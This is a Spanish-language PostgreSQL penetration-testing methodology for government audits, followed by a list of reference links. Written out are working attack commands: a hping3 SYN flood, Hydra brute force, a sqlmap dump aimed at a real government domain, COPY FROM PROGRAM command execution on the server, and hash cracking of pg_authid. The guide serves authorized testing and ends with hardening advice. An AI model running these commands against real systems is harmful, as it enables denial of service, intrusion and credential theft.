 

## Estructura del Repositorio de Auditoría

Este es el estándar que debe seguir tu repositorio para que cualquier arquitecto de seguridad pueda ejecutar las pruebas de forma ordenada.

```text
/Postgres-Gov-Pentest-Framework
│
├── 01-Recon/              # Nmap scripts, Banner Grabbing (NC), Port Scanning
├── 02-Enumeration/        # Scripts SQL para roles, permisos y configuración de red
├── 03-Vulnerability/      # Escaneo de SSL/TLS y búsqueda de CVEs (Nessus, Nmap)
├── 04-Attacks/            # Fuerza bruta (Hydra), DoS (Hping3), SQL Injection (Sqlmap)
├── 05-Cracking/           # Hashes SCRAM/MD5, reglas de Hashcat y John the Ripper
├── 06-Exploitation/       # Escalamiento (COPY PROGRAM), RCE y exploits de Metasploit
├── 07-Hardening/          # CIS Benchmark, auditoría de pg_hba.conf y logs
└── cheatsheet.md          # Referencia rápida de comandos "One-liners"

```

---

## Fase 1: Reconocimiento y Descubrimiento (Recon)

El primer paso es validar si el servicio es visible y qué versión reporta.

* **Netcat (nc):** Esencial para el banner grabbing y verificar si el puerto 5432 responde sin completar un handshake complejo.
* `nc -zv <IP_POSTGRES> 5432` (Escaneo rápido).
* `nc -v <IP_POSTGRES> 5432` (Para intentar capturar el banner del servicio).


* **Nmap:** Identificación de versión y scripts de seguridad.
* `nmap -sV --script pgsql-brute -p 5432 <IP>`



---

## Fase 2: Ataques de Disponibilidad y Fuerza Bruta

En auditorías de gobierno, es vital saber si el servidor soporta un ataque de denegación de servicio (DoS) o si las cuentas son vulnerables a ataques externos.

* **Ataques DoS (Denial of Service):**
* **hping3:** Para inundación de SYN y saturar la pila TCP del servidor.
* `hping3 -S -p 5432 --flood <IP>`




* **Fuerza Bruta al Puerto:**
* **Hydra:** La herramienta más rápida para ataques de red.
* `hydra -L usuarios.txt -P passwords.txt <IP> postgres`


* **Metasploit:** Módulo `auxiliary/scanner/postgres/postgres_login`.



---

## Fase 3: Vulnerabilidades de Cifrado y SQL Injection

No basta con entrar; hay que ver si los datos en tránsito y las aplicaciones que consumen la DB son seguras.

* **Validación de SSL/TLS:**
* **testssl.sh:** Para verificar si el servidor acepta cifrados débiles (como SSLv3 o TLS 1.0) o es vulnerable a Heartbleed.
* **nmap --script ssl-enum-ciphers:** Para listar los ciphers permitidos por el Postgres.


* **SQL Injection (SQLi):**
* **sqlmap:** Si la DB está conectada a un aplicativo web gubernamental, sqlmap es la ley.
* `sqlmap -u "https://gob.mx/api?id=1" --dbms=postgresql --dump`





---

## Fase 4: Exfiltración y Cracking de Hashes (Cracking)

Si lograste acceso o un dump de la tabla `pg_authid`, el objetivo es romper los hashes para probar que la política de contraseñas no se cumple.

* **Extracción Automatizada:**
* Usa scripts en **Python (Psycopg2)** para automatizar la extracción de hashes y guardarlos en formato compatible.


* **Herramientas de Cracking:**
* **Hashcat:** El más potente para GPU.
* `Mode 22600` para **SCRAM-SHA-256**.
* `Mode 10` para **MD5**.


* **John the Ripper:** Excelente para ataques CPU.
* Comando: `john --format=postgres-scram hashes.txt`





---

## Fase 5: Explotación y Ejecución de Comandos (RCE)

El "Santo Grial" del pentesting en Postgres es ejecutar comandos en el sistema operativo (OS) del servidor.

* **Abuso de `COPY FROM PROGRAM`:** Si el usuario es superusuario, puede ejecutar comandos de Linux:
```sql
CREATE TABLE cmd_exec(out text);
COPY cmd_exec FROM PROGRAM 'id; uname -a';
SELECT * FROM cmd_exec;

```


* **Metasploit Exploit:** `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`.
* **Búsqueda de CVEs:** Consultar siempre [Exploit-DB](https://www.exploit-db.com/) para versiones específicas (ej. CVE-2019-9193).

---

## Fase 6: Resultado Final y Hardening (Reporte)

La auditoría termina con un plan de remediación basado en estándares internacionales.

1. **Validación CIS Benchmark:** El documento debe incluir una lista de verificación de los controles CIS (Center for Internet Security) para PostgreSQL.
* *Ejemplo:* "Asegurar que `log_connections` esté en `on`".


2. **Reporte Técnico:** Se entrega un PDF con los hashes rotos, la evidencia de RCE y las vulnerabilidades TLS encontradas.
3. **Remediación:** Configuración de `pg_hba.conf` para restringir IPs y forzar el uso de `scram-sha-256`.

 


```text
https://minervadb.xyz/postgresql-threat-modeling-for-fintech/

https://medium.com/@lordhorcrux_/ultimate-guide-postgresql-pentesting-989055d5551e
https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9
https://medium.verylazytech.com/how-to-exploit-pentesting-postgresql-port-5432-5433-645c8eea8a3c
https://fedoraproject.org/wiki/Metasploit_Postgres_Setup
https://www.hackingarticles.in/penetration-testing-on-postgresql-5432/
https://blog.nashtechglobal.com/postgresql-security-how-weak-passwords-and-unencrypted-connections-invite-hackers/
https://pentestacademy.wordpress.com/tag/postgresql/
https://pentestlab.blog/tag/postgresql/
https://www.poplabsec.com/postgresql-penetration-testing/
https://hackerwhite.com/services/pentesting-postgresql
https://infosecwriteups.com/postgresql-penetration-testing-a-comprehensive-guide-33d21c4dceba
https://hackviser.com/tactics/pentesting/services/postgresql
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL
https://onsecurity.io/article/pentesting-postgresql-with-sql-injections/

https://github.com/curtishoughton/Penetration-Testing-Cheat-Sheet/tree/master/PostgreSQL
https://github.com/OWASP/www-project-web-security-testing-guide/blob/master/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL.md

https://gist.github.com/gquere/c91aaee3f52c05c3c9e6ce0b3cfe6895

https://github.com/JFR-C/Database-Security-Audit/blob/master/PostgreSQL%20database%20penetration%20testing
https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md


------- SQL Injection ------
https://www.red-gate.com/simple-talk/databases/postgresql/securing-postgresql-against-injection-misconfiguration-and-privilege-escalation/
https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
https://onsecurity.io/article/pentesting-postgresql-with-sql-injections-2/
https://portswigger.net/web-security/sql-injection/cheat-sheet

----- Hardening --------

PostgreSQL Security: A Comprehensive Guide to Hardening Your Database -> https://www.percona.com/blog/postgresql-database-security-what-you-need-to-know/ 
PostgreSQL Security: 12 rules for database hardening -> https://www.cybertec-postgresql.com/en/postgresql-security-things-to-avoid-in-real-life/

How to Secure PostgreSQL: Security Hardening Best Practices and Tips -> https://www.enterprisedb.com/blog/how-to-secure-postgresql-security-hardening-best-practices-checklist-tips-encryption-authentication-vulnerabilities

----- Servicio -------

https://www.aptive.co.uk/penetration-testing/postgresql/
```
